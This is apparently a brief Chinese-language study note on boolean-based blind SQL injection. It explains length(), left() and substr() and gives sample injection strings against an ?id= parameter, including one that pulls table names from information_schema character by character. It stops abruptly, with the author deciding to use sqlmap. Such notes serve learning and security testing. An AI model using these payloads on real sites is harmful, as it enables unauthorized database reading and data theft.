# sql盲注

<br><br>

写在前面：盲注可以使用逻辑符and来对我们的指令进行判断
如： /?id=1' and length(database())=8-- #

<br>

````
常用判断语句和函数
length(database())=8 判断当前所在库的长度为8
left()函数返回str字符串中最左边的长度字符。如果str或length参数为NULL，则返回NULL值 如：left(str,length)：
substr()函数：从指定位置开始的输入字符串返回一个子字符串。SUBSTR(字符串, 起点);
````

<br>

## 布尔盲注

<br>

### 第一步：寻找注入点（略）

<br>

### 第二步：判断数据库长度，然后猜测数据库名字

判断当前所在库的长度为8： ?id=1' and length(database())=8--+

然后可以开始进行数据库的猜测了。

猜测数据库第一位： ?id=1' and left(database(),1)>'a' --+ 以此类推可以获得库名

获得库名后可以查表了：?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database()limit 0,1),1,1))>80-- #

上述可以在database()对应的库中查询数据库的第一个表的第一个字符。其中的table_schema 可以写成 ='security'。

<br>



### 写不下去了，直接用sqlmap梭哈就完事了，折腾这么多闹麻了

<br>
